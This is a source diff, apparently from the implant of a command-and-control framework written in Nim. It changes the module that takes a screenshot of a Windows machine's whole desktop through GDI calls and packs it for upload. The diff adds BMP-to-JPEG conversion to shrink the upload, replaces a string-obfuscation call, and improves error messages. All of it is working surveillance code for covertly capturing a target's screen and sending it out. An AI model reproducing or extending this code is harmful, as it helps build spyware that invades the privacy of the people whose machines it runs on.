@@ -28,10 +28,29 @@ when defined(agent):
 
     import winim/lean
     import winim/inc/wingdi
-    import strutils, strformat, times
+    import strformat, times, pixie
+    import stb_image/write as stbiw
+    import ../agent/utils/io
     import ../agent/protocol/result
-    import ../common/[utils, serialize]
+    import ../common/serialize
+
+    proc bmpToJpeg(data: seq[byte], quality: int = 80): seq[byte] =
+        let img: Image = decodeImage(Bytes.toString(data))
     
+        # Convert to JPEG image for smaller file size
+        var rgbaData = newSeq[byte](img.width * img.height * 4)
+        var i = 0
+        for y in 0..<img.height:
+            for x in 0..<img.width:
+                let color = img[x, y]
+                rgbaData[i] = color.r
+                rgbaData[i + 1] = color.g
+                rgbaData[i + 2] = color.b
+                rgbaData[i + 3] = color.a
+                i += 4
+        
+        return stbiw.writeJPG(img.width, img.height, 4, rgbaData, quality)
+
     proc takeScreenshot(): seq[byte] = 
         
         var
@@ -64,17 +83,17 @@ when defined(agent):
         # Obtain handle to the device context for the entire screen
         deviceCtx = GetDC(0)
         if deviceCtx == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
         defer: ReleaseDC(0, deviceCtx)
 
         # Fetch BITMAP structure using GetCurrentObject and GetObjectW
         gdiCurrent = GetCurrentObject(deviceCtx, OBJ_BITMAP)
         if gdiCurrent == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
         defer: DeleteObject(gdiCurrent)
 
         if GetObjectW(gdiCurrent, ULONG(sizeof(BITMAP)), addr desktop) == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
 
         # Construct BMP headers
         # Calculate amount of bits required to represent screenshot
@@ -95,13 +114,13 @@ when defined(agent):
         screenshotLength = bmpFileHeader.bfSize
         screenshotBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotLength)
         if screenshotBytes == NULL: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
         defer: HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotBytes)
 
         # Assembly the bitmap image 
         memDeviceCtx = CreateCompatibleDC(deviceCtx)
         if memDeviceCtx == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
         defer: ReleaseDC(0, memDeviceCtx)
         
         # Initialize BITMAPINFO with prepared info header
@@ -109,12 +128,12 @@ when defined(agent):
 
         bmpSection = CreateDIBSection(deviceCtx, addr bmpInfo, DIB_RGB_COLORS, addr bitsBuffer, cast[HANDLE](NULL), 0) 
         if bmpSection == 0 or bitsBuffer == NULL: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
     
         # Select the newly created bitmap into the memory device context
         gdiObject = SelectObject(memDeviceCtx, bmpSection)
         if gdiObject == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
         defer: DeleteObject(gdiObject)
 
         # Copy the screen content from the source device context to the memory device context
@@ -126,7 +145,7 @@ when defined(agent):
             resX, resY,                             # Source coordinates
             SRCCOPY                                 # Copy source directly to destination
         ) == 0: 
-            raise newException(CatchableError, $GetLastError())
+            raise newException(CatchableError, GetLastError().getError())
 
         # Return the screenshot as a seq[byte]
         result = newSeq[byte](screenshotLength)
@@ -137,11 +156,11 @@ when defined(agent):
     proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
 
-            echo protect("    [>] Taking and uploading screenshot.")
+            print "    [>] Taking and uploading screenshot."
 
             let
-                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.bmp"
-                screenshotBytes: seq[byte] = takeScreenshot() 
+                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.jpeg"
+                screenshotBytes: seq[byte] = bmpToJpeg(takeScreenshot())
 
             var packer = Packer.init() 
 
